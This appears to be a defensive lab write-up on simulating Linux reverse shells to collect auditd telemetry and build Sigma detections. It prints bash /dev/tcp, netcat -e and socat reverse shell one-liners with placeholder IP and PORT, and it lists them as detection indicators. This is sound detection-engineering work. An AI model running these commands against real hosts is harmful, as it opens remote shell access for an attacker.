# Reverse Shell Execution Scenario

---

# Overview

This scenario simulates Linux reverse shell execution behavior commonly observed during post-exploitation activity.

The objective of the simulation is to reproduce attacker tradecraft involving:

- shell interpreter execution
- outbound callback communication
- interactive remote access
- shell-to-network correlation
- command-and-control behavior

The scenario was developed to support:

- Linux detection engineering
- telemetry analysis
- Sigma rule development
- ATT&CK-aligned analytics
- investigation workflows
- process lineage analysis

---

# Scenario Objectives

The simulation aimed to reproduce realistic reverse shell behavior while generating observable telemetry for detection engineering.

Primary objectives included:

- simulate reverse shell execution
- capture shell execution telemetry
- observe outbound network callbacks
- analyze process ancestry
- validate behavioral detection logic
- engineer Sigma detections
- perform forensic investigation workflows
- validate telemetry quality

---

# MITRE ATT&CK Mapping

| ATT&CK Tactic | Technique | ID |
|---|---|---|
| Execution | Command and Scripting Interpreter | T1059 |
| Execution | Unix Shell | T1059.004 |
| Command and Control | Application Layer Protocol | T1071 |
| Command and Control | Non-Application Layer Protocol | T1095 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

# Lab Environment

| Component | Description |
|---|---|
| Operating System | Ubuntu Linux |
| Telemetry Source | auditd |
| Process Monitoring | ps, pstree, htop |
| Network Monitoring | ss, netstat |
| Detection Format | Sigma |
| Analysis Type | Behavioral Detection Engineering |

---

# Scenario Description

The simulation reproduced a reverse shell callback from the Linux host to an attacker-controlled listener.

The attack behavior included:

- shell interpreter execution
- outbound TCP connection
- shell redirection
- interactive shell creation
- remote command execution capability

The simulation focused heavily on:

```text
Shell Execution
        +
Process Lineage
        +
Outbound Network Activity
```

This behavioral correlation formed the foundation of the detection engineering workflow.

---

# Simulated Reverse Shell Techniques

The scenario analyzed multiple reverse shell tradecraft patterns.

---

# Bash TCP Reverse Shell

## Example

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

---

## Behavioral Indicators

| Indicator | Detection Value |
|---|---|
| `/dev/tcp/` | High |
| `bash -i` | High |
| `0>&1` | High |
| outbound callback | Critical |

---

# Netcat Reverse Shell

## Example

```bash
nc -e /bin/bash IP PORT
```

---

## Behavioral Indicators

| Indicator | Detection Value |
|---|---|
| `nc -e` | High |
| shell-spawned networking utility | High |
| outbound TCP callback | High |

---

# Python Reverse Shell

## Example

```python
python -c 'import socket,subprocess,os'
```

---

## Behavioral Indicators

| Indicator | Detection Value |
|---|---|
| inline Python execution | Medium |
| socket creation | High |
| subprocess shell execution | High |

---

# Socat Reverse Shell

## Example

```bash
socat TCP:IP:PORT EXEC:/bin/bash
```

---

## Behavioral Indicators

| Indicator | Detection Value |
|---|---|
| `EXEC:/bin/bash` | High |
| shell relay behavior | High |
| outbound callback | High |

---

# Attack Flow

```text
Shell Execution
        ↓
Reverse Shell Syntax Invocation
        ↓
Socket Creation
        ↓
Outbound TCP Callback
        ↓
Listener Receives Connection
        ↓
Interactive Remote Access Established
```

---

# Scenario Workflow

The reverse shell execution simulation followed the workflow below.

```text
Baseline Collection
        ↓
Auditd Configuration
        ↓
Reverse Shell Execution
        ↓
Telemetry Collection
        ↓
Process Lineage Analysis
        ↓
Network Correlation
        ↓
Detection Engineering
        ↓
Sigma Rule Development
        ↓
Investigation Workflow
        ↓
Validation
        ↓
Cleanup & Environment Restoration
```

---

# Telemetry Collection

# Process Telemetry

The simulation collected:

- shell execution events
- command-line telemetry
- parent-child process lineage
- PID/PPID relationships
- execution timestamps

---

# Network Telemetry

The simulation captured:

- outbound TCP connections
- callback activity
- listening socket information
- shell-associated network sessions

---

# Auditd Telemetry

Relevant syscalls monitored during the simulation included:

```text
execve
connect
socket
dup2
```

---

# Auditd Rules Used

## Process Execution Monitoring

```bash
-a always,exit -F arch=b64 -S execve -k exec_monitor
```

---

## Network Connection Monitoring

```bash
-a always,exit -F arch=b64 -S connect -k network_connect
```

---

## Socket Monitoring

```bash
-a always,exit -F arch=b64 -S socket -k socket_monitor
```

---

# Detection Engineering Focus

The simulation emphasized behavioral analytics instead of simplistic indicators.

The strongest detection signal originated from:

```text
Shell Execution
        +
Outbound Network Connection
        +
Suspicious Command-Line Syntax
        +
Process Lineage Correlation
```

---

# Detection Opportunities

## High-Fidelity Indicators

| Detection Opportunity | Fidelity |
|---|---|
| shell + outbound callback | Critical |
| `/dev/tcp/` usage | High |
| shell-spawned networking utility | High |
| suspicious process ancestry | High |
| reverse shell command syntax | High |

---

# Process Lineage Examples

## Bash Reverse Shell

```text
bash
 └── outbound TCP connection
```

---

## Netcat Execution Chain

```text
bash
 └── nc
      └── outbound connection
```

---

## Web Exploitation Scenario

```text
apache2
 └── bash
      └── nc
```

---

# Telemetry Challenges Observed

# Challenge 1 — Incomplete Shell Visibility

Reverse shell visibility depended heavily on:

- execve monitoring
- command-line telemetry
- process execution logging

---

# Challenge 2 — Weak Process-to-Network Correlation

Some network telemetry lacked:

- PID attribution
- shell association
- ancestry correlation

---

# Challenge 3 — Short-Lived Process Visibility

Transient reverse shell processes reduced visibility into:

- process ancestry
- shell execution
- command-line capture

---

# Challenge 4 — Tooling Inconsistency

Different tools produced varying visibility into process hierarchies.

Observed differences included:

- htop lineage visibility
- pstree ancestry representation
- auditd telemetry limitations

---

# Detection Artifacts Generated

The simulation produced:

- detection logic documentation
- Sigma detection rules
- telemetry analysis
- ATT&CK threat mapping
- investigation workflows
- validation documentation
- evidence artifacts
- sample telemetry events

---

# Key Files Generated

# Detection Logic

```text
detections/logic/reverse-shell-execution-logic.md
```

---

# Sigma Rule

```text
detections/sigma/linux/reverse-shell-execution.yml
```

---

# Investigation Workflow

```text
investigations/reverse-shell-execution-investigation.md
```

---

# Telemetry Analysis

```text
telemetry/reverse-shell-execution-telemetry.md
```

---

# Validation

```text
detections/validation/reverse-shell-execution-validation.md
```

---

# Threat Mapping

```text
docs/threat-mapping/reverse-shell-execution.md
```

---

# Evidence Artifacts

```text
evidence/reverse-shell-execution/
```

---

# Logs

```text
logs/reverse-shell-execution/
```

---

# Samples

```text
samples/reverse-shell-execution/
```

---

# Evidence Collection

Collected evidence included:

| Evidence | Purpose |
|---|---|
| reverse-shell-listener.png | listener validation |
| network-connection-proof.png | outbound callback visibility |
| process-lineage(htop).png | ancestry visibility |
| auditd-execve-proof.jpg | syscall telemetry proof |
| detection-trigger-proof.png | Sigma detection validation |
| cleanup-proof.png | environment restoration validation |

---

# Cleanup & Restoration

The simulation included operational cleanup procedures to restore the environment to baseline state.

Cleanup validation included:

- listener termination
- shell process termination
- socket verification
- artifact removal
- auditd restoration
- baseline environment verification

---

# Detection Engineering Insights

# Insight 1 — Behavioral Correlation Is Mandatory

Reliable reverse shell detection required:

```text
Shell Execution
        +
Network Activity
        +
Process Lineage
```

Single indicators produced weaker fidelity.

---

# Insight 2 — Command-Line Analytics Are High Value

The strongest indicators included:

- `/dev/tcp/`
- `0>&1`
- `bash -i`
- `nc -e`
- `EXEC:/bin/bash`

---

# Insight 3 — Process Lineage Improves Confidence

Suspicious ancestry chains significantly improved detection confidence.

Examples:

```text
apache2 → bash
python → sh
systemd → bash
```

---

# Insight 4 — Network Telemetry Alone Is Weak

Network events without process attribution generated weak detection fidelity.

Process-linked networking telemetry was significantly more valuable.

---

# Final Outcome

The reverse shell execution simulation successfully reproduced realistic Linux post-exploitation behavior and generated operationally valuable telemetry for detection engineering.

The simulation validated that:

- reverse shell activity generates observable telemetry
- shell-to-network correlation is the strongest detection signal
- process lineage significantly improves detection quality
- behavioral analytics outperform isolated indicators
- ATT&CK-aligned detection engineering improves investigation capability

The scenario now serves as a complete Linux reverse shell detection engineering case study suitable for:

- Sigma development
- ATT&CK alignment
- telemetry analysis
- investigation workflows
- behavioral analytics engineering
- portfolio demonstration
- future detection expansion
